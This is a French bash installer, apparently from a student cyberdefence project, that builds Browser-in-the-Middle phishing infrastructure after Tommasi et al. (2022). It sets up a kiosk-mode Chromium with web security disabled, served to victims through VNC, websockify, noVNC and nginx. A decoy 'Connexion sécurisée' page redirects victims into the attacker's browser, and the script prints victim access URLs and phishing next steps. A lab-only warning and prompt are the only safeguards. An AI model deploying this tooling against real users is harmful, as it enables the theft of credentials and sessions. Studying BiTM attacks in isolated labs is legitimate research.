#!/bin/bash

################################################################################
# Script d'installation BiTM (Browser-in-the-Middle)
# Pour Ubuntu Server 22.04/24.04
# Basé sur Tommasi et al. (2022)
#
# Auteur: Script PFE Cyberdéfense ENSIBS
# Date: Avril 2026
################################################################################

set -e  # Arrêter en cas d'erreur

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Variables de configuration
BITM_USER=$(whoami)
BITM_HOME="/home/${BITM_USER}"
VNC_PORT=5900
WEBSOCKIFY_PORT=6080
HTTP_PORT=8080
VNC_DISPLAY=:1
VNC_GEOMETRY="1920x1080"
VNC_PASSWORD="bitm2026"  # À changer en production

################################################################################
# Fonctions utilitaires
################################################################################

print_header() {
    echo -e "\n${BLUE}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}\n"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_info() {
    echo -e "${BLUE}ℹ $1${NC}"
}

################################################################################
# Étape 1: Mise à jour du système
################################################################################

install_system_updates() {
    print_header "Étape 1/7: Mise à jour du système"
    
    print_info "Mise à jour de la liste des paquets..."
    sudo apt update -qq
    
    print_info "Mise à niveau des paquets existants..."
    sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y -qq
    
    print_success "Système mis à jour"
}

################################################################################
# Étape 2: Installation de l'environnement graphique minimal
################################################################################

install_graphical_environment() {
    print_header "Étape 2/7: Installation environnement graphique minimal (X11 + Fluxbox)"
    
    print_info "Installation du serveur X11..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        xorg \
        x11-xserver-utils \
        xinit
    
    print_info "Installation de Fluxbox (window manager léger)..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        fluxbox \
        xterm
    
    print_success "Environnement graphique installé"
}

################################################################################
# Étape 3: Installation de Chromium
################################################################################

install_chromium() {
    print_header "Étape 3/7: Installation de Chromium"
    
    print_info "Installation de Chromium et dépendances..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        chromium-browser \
        chromium-browser-l10n \
        chromium-codecs-ffmpeg
    
    # Vérifier l'installation
    if command -v chromium-browser &> /dev/null; then
        CHROMIUM_VERSION=$(chromium-browser --version)
        print_success "Chromium installé: ${CHROMIUM_VERSION}"
    else
        print_error "Erreur lors de l'installation de Chromium"
        exit 1
    fi
}

################################################################################
# Étape 4: Installation du serveur VNC (TigerVNC)
################################################################################

install_vnc_server() {
    print_header "Étape 4/7: Installation de TigerVNC Server"
    
    print_info "Installation de TigerVNC..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        tigervnc-standalone-server \
        tigervnc-common
    
    # Créer le répertoire VNC
    mkdir -p ${BITM_HOME}/.vnc
    
    # Configurer le mot de passe VNC
    print_info "Configuration du mot de passe VNC..."
    echo "${VNC_PASSWORD}" | vncpasswd -f > ${BITM_HOME}/.vnc/passwd
    chmod 600 ${BITM_HOME}/.vnc/passwd
    
    # Créer le fichier xstartup
    print_info "Création du fichier xstartup..."
    cat > ${BITM_HOME}/.vnc/xstartup << 'EOF'
#!/bin/bash
# Démarrage de l'environnement VNC pour BiTM

# Désactiver le screensaver
xset s off
xset -dpms
xset s noblank

# Démarrer Fluxbox
fluxbox &

# Attendre que Fluxbox soit prêt
sleep 2

# Lancer Chromium en mode kiosque (sans bordures)
chromium-browser \
    --no-first-run \
    --disable-infobars \
    --disable-session-crashed-bubble \
    --disable-notifications \
    --start-maximized \
    --kiosk \
    --app=about:blank \
    --disable-features=TranslateUI \
    --disable-web-security \
    --user-data-dir=/tmp/chromium-bitm &

# Garder la session active
wait
EOF
    
    chmod +x ${BITM_HOME}/.vnc/xstartup
    
    # Créer le fichier de configuration VNC
    print_info "Création de la configuration VNC..."
    cat > ${BITM_HOME}/.vnc/config << EOF
geometry=${VNC_GEOMETRY}
depth=24
dpi=96
EOF
    
    print_success "TigerVNC Server configuré"
}

################################################################################
# Étape 5: Installation de Python et Websockify
################################################################################

install_websockify() {
    print_header "Étape 5/7: Installation de Websockify (Proxy WebSocket ↔ VNC)"
    
    print_info "Installation de Python3 et pip..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        python3 \
        python3-pip \
        python3-numpy
    
    print_info "Installation de Websockify via pip..."
    sudo pip3 install --break-system-packages websockify
    
    # Vérifier l'installation
    if command -v websockify &> /dev/null; then
        print_success "Websockify installé"
    else
        print_error "Erreur lors de l'installation de Websockify"
        exit 1
    fi
}

################################################################################
# Étape 6: Installation de noVNC
################################################################################

install_novnc() {
    print_header "Étape 6/7: Installation de noVNC (Client VNC HTML5)"
    
    print_info "Installation de git..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq git
    
    print_info "Téléchargement de noVNC depuis GitHub..."
    cd ${BITM_HOME}
    
    # Supprimer si existe déjà
    rm -rf noVNC
    
    git clone --quiet https://github.com/novnc/noVNC.git
    cd noVNC
    
    # Checkout de la version stable
    git checkout --quiet v1.4.0
    
    print_info "Création de la page d'index personnalisée..."
    cat > ${BITM_HOME}/noVNC/index.html << 'EOF'
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion sécurisée</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: #1a1a1a;
        }
        #loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Connexion sécurisée en cours...</p>
    </div>
    <script>
        // Rediriger automatiquement vers vnc.html
        setTimeout(() => {
            window.location.href = 'vnc.html?autoconnect=true&reconnect=true&resize=remote';
        }, 1500);
    </script>
</body>
</html>
EOF
    
    print_success "noVNC installé (v1.4.0)"
}

################################################################################
# Étape 7: Installation et configuration de nginx
################################################################################

install_nginx() {
    print_header "Étape 7/7: Installation de nginx (Serveur Web)"
    
    print_info "Installation de nginx..."
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq nginx
    
    print_info "Configuration de nginx pour BiTM..."
    sudo tee /etc/nginx/sites-available/bitm > /dev/null << EOF
server {
    listen ${HTTP_PORT};
    server_name _;

    # Logs
    access_log /var/log/nginx/bitm-access.log;
    error_log /var/log/nginx/bitm-error.log;

    # noVNC files
    root ${BITM_HOME}/noVNC;
    index index.html;

    # Servir les fichiers statiques noVNC
    location / {
        try_files \$uri \$uri/ =404;
    }

    # Proxy WebSocket pour Websockify
    location /websockify {
        proxy_pass http://localhost:${WEBSOCKIFY_PORT};
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_read_timeout 86400;
    }
}
EOF
    
    # Activer le site
    sudo ln -sf /etc/nginx/sites-available/bitm /etc/nginx/sites-enabled/bitm
    sudo rm -f /etc/nginx/sites-enabled/default
    
    # Tester la configuration
    sudo nginx -t
    
    # Redémarrer nginx
    sudo systemctl restart nginx
    sudo systemctl enable nginx
    
    print_success "nginx configuré et démarré"
}

################################################################################
# Création des scripts de démarrage
################################################################################

create_startup_scripts() {
    print_header "Création des scripts de démarrage"
    
    # Script pour démarrer VNC
    print_info "Création du script start-vnc.sh..."
    cat > ${BITM_HOME}/start-vnc.sh << EOF
#!/bin/bash
# Script de démarrage du serveur VNC BiTM

echo "Démarrage du serveur VNC sur display ${VNC_DISPLAY}..."
vncserver ${VNC_DISPLAY} -geometry ${VNC_GEOMETRY} -depth 24

echo "Serveur VNC démarré"
echo "Port: ${VNC_PORT}"
echo "Display: ${VNC_DISPLAY}"
EOF
    chmod +x ${BITM_HOME}/start-vnc.sh
    
    # Script pour démarrer Websockify
    print_info "Création du script start-websockify.sh..."
    cat > ${BITM_HOME}/start-websockify.sh << EOF
#!/bin/bash
# Script de démarrage de Websockify

echo "Démarrage de Websockify..."
websockify --web ${BITM_HOME}/noVNC ${WEBSOCKIFY_PORT} localhost:${VNC_PORT} &

echo "Websockify démarré"
echo "Port WebSocket: ${WEBSOCKIFY_PORT}"
echo "Cible VNC: localhost:${VNC_PORT}"
EOF
    chmod +x ${BITM_HOME}/start-websockify.sh
    
    # Script pour arrêter tout
    print_info "Création du script stop-bitm.sh..."
    cat > ${BITM_HOME}/stop-bitm.sh << EOF
#!/bin/bash
# Script d'arrêt de l'infrastructure BiTM

echo "Arrêt du serveur VNC..."
vncserver -kill ${VNC_DISPLAY} 2>/dev/null || true

echo "Arrêt de Websockify..."
pkill -f websockify 2>/dev/null || true

echo "Infrastructure BiTM arrêtée"
EOF
    chmod +x ${BITM_HOME}/stop-bitm.sh
    
    # Script de démarrage complet
    print_info "Création du script start-bitm.sh (démarrage complet)..."
    cat > ${BITM_HOME}/start-bitm.sh << 'EOF'
#!/bin/bash
# Script de démarrage complet de l'infrastructure BiTM

BITM_HOME="/home/$(whoami)"

echo "═══════════════════════════════════════════════════"
echo "  Démarrage de l'infrastructure BiTM"
echo "═══════════════════════════════════════════════════"
echo ""

# 1. Démarrer VNC
echo "[1/2] Démarrage du serveur VNC..."
${BITM_HOME}/start-vnc.sh
sleep 3

# 2. Démarrer Websockify
echo "[2/2] Démarrage de Websockify..."
${BITM_HOME}/start-websockify.sh
sleep 2

echo ""
echo "═══════════════════════════════════════════════════"
echo "  Infrastructure BiTM démarrée avec succès !"
echo "═══════════════════════════════════════════════════"
echo ""
echo "Accès victime: http://$(hostname -I | awk '{print $1}'):8080"
echo ""
echo "Commandes utiles:"
echo "  - Arrêter: ~/stop-bitm.sh"
echo "  - Logs VNC: ~/.vnc/*.log"
echo "  - Logs nginx: /var/log/nginx/bitm-*.log"
echo ""
EOF
    chmod +x ${BITM_HOME}/start-bitm.sh
    
    print_success "Scripts de démarrage créés"
}

################################################################################
# Configuration du firewall
################################################################################

configure_firewall() {
    print_header "Configuration du firewall (UFW)"
    
    # Vérifier si UFW est installé
    if ! command -v ufw &> /dev/null; then
        print_info "Installation de UFW..."
        sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq ufw
    fi
    
    print_info "Configuration des règles firewall..."
    
    # Autoriser SSH (important!)
    sudo ufw allow 22/tcp comment 'SSH' > /dev/null 2>&1
    
    # Autoriser HTTP pour noVNC
    sudo ufw allow ${HTTP_PORT}/tcp comment 'BiTM HTTP' > /dev/null 2>&1
    
    # Autoriser WebSocket (si différent de HTTP)
    if [ ${WEBSOCKIFY_PORT} -ne ${HTTP_PORT} ]; then
        sudo ufw allow ${WEBSOCKIFY_PORT}/tcp comment 'BiTM WebSocket' > /dev/null 2>&1
    fi
    
    # Activer UFW (sans confirmation)
    sudo ufw --force enable > /dev/null 2>&1
    
    print_success "Firewall configuré"
}

################################################################################
# Affichage du récapitulatif
################################################################################

show_summary() {
    print_header "Installation terminée !"
    
    IP_ADDRESS=$(hostname -I | awk '{print $1}')
    
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║       Infrastructure BiTM installée avec succès !        ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}📋 Configuration:${NC}"
    echo "   • VNC Display: ${VNC_DISPLAY}"
    echo "   • VNC Port: ${VNC_PORT}"
    echo "   • WebSocket Port: ${WEBSOCKIFY_PORT}"
    echo "   • HTTP Port: ${HTTP_PORT}"
    echo "   • Mot de passe VNC: ${VNC_PASSWORD}"
    echo ""
    echo -e "${BLUE}🌐 URL d'accès (pour la victime):${NC}"
    echo "   http://${IP_ADDRESS}:${HTTP_PORT}"
    echo ""
    echo -e "${BLUE}🚀 Démarrage:${NC}"
    echo "   ${BITM_HOME}/start-bitm.sh"
    echo ""
    echo -e "${BLUE}🛑 Arrêt:${NC}"
    echo "   ${BITM_HOME}/stop-bitm.sh"
    echo ""
    echo -e "${YELLOW}⚠️  Prochaines étapes:${NC}"
    echo "   1. Démarrer l'infrastructure: ./start-bitm.sh"
    echo "   2. Tester l'accès depuis un navigateur"
    echo "   3. Configurer le phishing (domaine, certificat SSL)"
    echo ""
    echo -e "${BLUE}📚 Documentation:${NC}"
    echo "   • Logs VNC: ${BITM_HOME}/.vnc/*.log"
    echo "   • Logs nginx: /var/log/nginx/bitm-*.log"
    echo "   • Scripts: ${BITM_HOME}/*.sh"
    echo ""
}

################################################################################
# Fonction principale
################################################################################

main() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║   Installation BiTM (Browser-in-the-Middle)                   ║
║   Basé sur Tommasi et al. (2022)                              ║
║                                                                ║
║   PFE Cyberdéfense ENSIBS - 2026                              ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    
    print_warning "Ce script installe une infrastructure d'attaque BiTM"
    print_warning "À utiliser UNIQUEMENT dans un environnement de laboratoire isolé"
    echo ""
    
    read -p "Continuer l'installation? (o/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Oo]$ ]]; then
        echo "Installation annulée."
        exit 0
    fi
    
    # Vérifier que le script n'est pas exécuté en tant que root
    if [[ $EUID -eq 0 ]]; then
        print_error "Ce script ne doit PAS être exécuté en tant que root"
        print_error "Exécutez-le avec votre utilisateur normal (qui a sudo)"
        exit 1
    fi
    
    # Exécuter les étapes d'installation
    install_system_updates
    install_graphical_environment
    install_chromium
    install_vnc_server
    install_websockify
    install_novnc
    install_nginx
    create_startup_scripts
    configure_firewall
    
    show_summary
}

# Lancer l'installation
main
